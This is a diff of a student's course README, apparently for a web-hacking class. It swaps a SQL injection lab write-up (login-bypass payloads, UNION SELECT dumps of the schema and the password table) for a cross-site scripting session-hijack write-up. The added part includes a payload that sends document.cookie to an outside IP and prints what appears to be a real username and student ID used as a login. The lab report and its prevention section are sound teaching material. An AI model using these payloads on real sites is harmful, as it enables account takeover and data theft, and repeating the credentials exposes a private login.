@@ -40,96 +40,70 @@ This is a private repository for Mahitha Kalaga to store all the code from the c
 
 ## The Hackathon's overview
 
-In Hackathon 2 for the Web Application Programming and Hacking course, I explored various levels of SQL injection (SQLi) vulnerabilities to understand how attackers can exploit insecure web applications. The first two levels involved bypassing login pages using crafted SQL payloads—initially with single quotes and later with double quotes—highlighting differences in backend SQL handling. The third level focuses on vulnerabilities in URL parameters. By injecting SQL code directly into the URL, I was able to identify the number of database columns, display custom information, retrieve the full database schema, and extract login credentials. After decrypting hashed passwords using online MD5 tools, I successfully logged into the system with stolen credentials.
+In Hackathon 3, I explored Cross-Site Scripting (XSS) and session hijacking vulnerabilities to understand how attackers can gain unauthorized access without credentials. I began by injecting a malicious JavaScript payload into the blog application's comment section, which, when clicked by a logged-in user, silently transmitted their session cookie to a remote server I controlled. By retrieving the stolen cookie from the server logs, I was able to hijack the victim's session by manually injecting the session ID into my browser, gaining access without logging in. To test further vulnerabilities, I attempted SQL injection on various input fields post-hijack, but found the system to be resilient—likely due to parameterized queries. This exercise demonstrated the critical importance of input sanitization, secure cookie attributes, and strong session management in protecting web applications.
 
-Hackathon's URL: [Hackathon](https://github.com/kalagam1/waph-kalagam1/tree/main/hackathon3)
+Hackathon's URL: [Hackathon3](https://github.com/kalagam1/waph-kalagam1/tree/main/hackathon3)
 
-## Task 1: 
+Demo's URL: [Demo]()
 
-### Level 0: Basic SQL Injection
+## Task 1: The Attack
 
-I accessed a basic login page and performed a simple SQL injection attack to bypass authentication. By entering the payload kalagam1’ OR ‘1’=’1’;# into the username field, I was able to manipulate the SQL query so that it always returned true, regardless of the actual credentials. This demonstrated a common vulnerability where user inputs are not properly sanitized, allowing attackers to gain unauthorized access simply by injecting SQL logic into form fields.
+### Step 1: Attacker
 
-![level 0](../images/h2level0.jpeg)
+To initiate the attack, I accessed the blog application, which allows users to post comments without any form of input validation or sanitization. Recognizing this vulnerability, I crafted a cross-site scripting (XSS) payload intended to capture the session cookie of a logged-in user. The injected payload looked like this:
+<a onclick=window.location='http://192.168.56.102/?cookie='+document.cookie">click here</a> 
 
-![level 0](../images/h2level0.1.jpeg)
+![level 0](../images/h31.jpeg)
 
-### Level 1: Modified Injection Technique
+This script, when clicked by an authenticated user, would send their session cookie to the attacker’s server. The comment was submitted and publicly displayed on the blog.
 
-After some testing and error analysis, I successfully bypassed the login by using the payload kalagam1" OR "1"="1" LIMIT 1;#. This allowed me to log in without valid credentials by exploiting the structure of the SQL query. It also confirmed that understanding how backend queries are written—such as the use of single or double quotes—is critical when crafting effective SQL injections. 
+### Step 2: Victim
 
-![level 1](../images/h2level1.3.jpeg)
+Acting as the victim, I proceeded to log into the blog application using the UD credentials; kalagam1 and the corresponding 9-digit student ID (101831115). Upon successful authentication, I navigated to the comment section where the attacker’s malicious payload had been posted.
 
-![level 1](../images/h2level1.jpeg)
+![level 0](../images/h32.jpeg)
 
-![level 1](../images/h2level1.1.jpeg)
+![level 0](../images/h33.jpeg)
 
-![level 1](../images/h2level1.2.jpeg)
+![level 0](../images/h31.jpeg)
 
-### Level 2: Advanced SQL Injection and Data Extraction
+### Step 3: Victim
 
-#### A. Detecting SQL Injection Vulnerabilities
+Upon encountering the injected comment, I interacted with the hyperlink under the assumption that it was legitimate. This action triggered the malicious JavaScript embedded within the link, which immediately executed and sent the session cookie associated with the authenticated session to the attacker’s server.
 
-I explored the application to identify potential SQL injection points. While the login form was secure, I found that the id parameter in the product page URLs (such as for "apple" or "pear") was vulnerable. By injecting SQL statements directly into the URL using UNION SELECT, I was able to confirm that the backend was executing the injected SQL and returning the results. This revealed that the URL was the primary attack surface, making it a critical vulnerability that could expose database data if not properly handled.
+![level 0](../images/h31.jpeg)
 
-Injecting SQL statements like SELECT and UNION into the URL successfully returned data. For example: .../product.php?id=1 UNION SELECT 1,2
+![level 0](../images/h34.jpeg)
 
-![level 2](../images/h2level2.1.jpeg)
+### Step 4: Attacker
 
-![level 2](../images/h2level2.2.jpeg)
+On the attacker’s end, I had configured a listener to capture incoming HTTP requests. Once the victim interacted with the malicious link, the browser issued a request containing the session cookie to the attacker’s server. I verified the success of this action by inspecting the server logs, which revealed the session identifier (PHPSESSID). With this information, I was now equipped to impersonate the victim. To see the cookie information the terminal runs the following command:
+Cat /var/log/apache2/access.log
 
-![level 2](../images/h2level2.3.jpeg)
+![level 0](../images/h35.jpeg)
 
-The error response helped determine how many columns are expected.
+### Step 5: Attacker
 
-#### B. Exploiting the Vulnerability
+To hijack the victim’s session, I opened the blog application in a new incognito browser session and did not log in. Instead, I opened the browser’s developer tools and manually added the stolen PHPSESSID cookie under the Application tab. After refreshing the page, the application treated me as the logged-in user, granting access without requiring authentication credentials. This demonstrated a complete session hijack using only the stolen cookie.
 
-i. Identifying the Number of Columns
+![bonus](../images/h36.jpeg)
 
-To determine how many columns were expected in the backend query, I used trial-and-error with different UNION SELECT statements. Starting with two columns (1,2) triggered an error, so I increased the number of selected values until the injection succeeded with three columns. This confirmed that the SQL query used in the application’s backend was pulling data from three columns, which was essential for crafting successful payloads in later steps. This payload worked: .../product.php?id=1 UNION SELECT 1,2,3
+![bonus](../images/h37.jpeg)
 
-![level 3](../images/h2b.1.jpeg)
+### Bonus: 
 
-![level 3](../images/h2b1.2.jpeg)
+Following the successful session hijacking, I explored the application to assess whether it was also vulnerable to SQL injection. I tested the login and other input fields with common SQL injection payloads such as ' OR '1'='1, but the application rejected these inputs or returned appropriate error messages. This behavior suggests that the backend is likely using parameterized queries or has implemented input validation, rendering SQL injection attempts ineffective in this case.
 
-ii. Displaying Custom Information
+![bonus](../images/h3bonus1.jpeg)
 
-After identifying the correct number of columns, I crafted a UNION SELECT payload to display my own details on the web page. I inserted my username, full name, and section into the respective columns using the payload:
-.../product.php?id=1 UNION SELECT "kalagam1", "Mahitha", "M6"
-The application reflected this data on the page, proving that arbitrary user-controlled input could be injected and displayed, reinforcing the severity of the vulnerability.
+![bonus](../images/h3bonus2.jpeg)
 
-![level 4](../images/h2b.2.2.jpeg)
+## Task 2: Understanding and Prevention
 
-![level 4](../images/h2b.2.2.jpeg)
+#### Why the Attack Worked
 
-This allowed me to display my name, username, and section in the page.
+This attack was possible due to two primary vulnerabilities. First, the blog application lacked proper input sanitization, allowing the injection of executable JavaScript into the comment section. This made it susceptible to cross-site scripting (XSS). Second, the application stored session cookies without setting security flags such as HttpOnly and Secure, making them accessible via JavaScript. The attacker was able to steal this session data and reuse it to bypass authentication completely.
 
-iii. Revealing the Database Schema
+#### How This Can Be Prevented
 
-I attempted to retrieve metadata about the database by querying the information_schema.columns table. I used a UNION SELECT payload to extract table and column names, while placing a custom string (Hacked by kalagam1) in the third column. This payload allowed me to view the underlying structure of the database, which included sensitive tables such as those containing login credentials. To view table and column names from the database, I used: .../product.php?id=0 UNION SELECT table_name, column_name, 'Hacked by kalagam1' FROM information_schema.columns
-
-![level 5](../images/h2b.3.jpeg)
-
-This revealed full database structure, including login-related tables.
-
-![level 5](../images/h2b.4.1.jpeg)
-
-![level 5](../images/h2b.4.2.jpeg)
-
-iv. Extracting Login Credentials
-
-I targeted the login table to extract actual user credentials. Using another UNION SELECT statement, I retrieved login names and MD5-hashed passwords. I then decrypted these hashes using publicly available online tools to recover the plaintext passwords (e.g., qwerty, abc123). This showed how SQL injection could escalate from basic data exposure to full credential theft. To fetch actual credentials from the login table, I used: .../product.php?id=0 UNION SELECT loginname, password, 'Hacked by kalagam1' FROM login
-
-![level 6](../images/h2b.4.jpeg)
-
-#### C. Logging In with Stolen Credentials
-
-I used the decrypted login credentials obtained in the previous step to log into the system through the regular interface. The login was successful, confirming that the stolen data was valid and proving that the SQL injection vulnerability could lead to complete account compromise and unauthorized access to user accounts.
-
-![lab1](../images/h2c.1.1.jpeg)
-
-![lab1](../images/h2c.1.jpeg)
-
-![lab1](../images/h2c.2.1.jpeg)
-
-![lab1](../images/h2c.2.jpeg)
+As a developer, there are several things I’d do differently to prevent this. First, I’d make sure all user inputs—especially in comment sections—are properly sanitized and encoded before being displayed on the site. That would stop most XSS attacks. I’d also set the session cookies to have the HttpOnly, Secure, and SameSite flags so they can’t be accessed through scripts or passed around between sites. Finally, I’d implement proper session expiration and maybe even rotate the session ID on login/logout to reduce the window of attack. These are all practices we’ve been following in our WAPH projects. 
